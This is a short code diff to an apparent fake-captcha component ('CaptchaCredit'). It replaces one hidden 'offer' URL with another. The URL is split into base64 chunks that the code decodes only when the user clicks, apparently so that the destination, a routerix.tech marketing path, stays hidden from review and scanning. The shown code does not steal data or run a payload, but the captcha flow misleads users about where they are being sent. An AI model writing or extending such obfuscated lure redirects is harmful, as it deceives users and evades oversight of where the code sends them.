@@ -4,7 +4,14 @@ import './CaptchaCredit.css';
 type StepType = 'verify' | 'loading' | 'done';
 
 /** URL is split into base64 chunks — assembled & decoded only at click time */
-const _u = ['aHR0cHM6Ly9y', 'b3V0ZXJpeC50', 'ZWNoL3ZpZGVv', 'bWt0L2VuLw=='];
+const _u = [
+  'aHR0cHM6Ly9y',
+  'b3V0ZXJpeC50',
+  'ZWNoL2RpcmVj',
+  'dC9tYXJrZXRp',
+  'bmctZGlnaXRh',
+  'bC1lbi8=',
+];
 
 function buildOfferUrl(): string {
   const base = new URL(atob(_u.join('')));
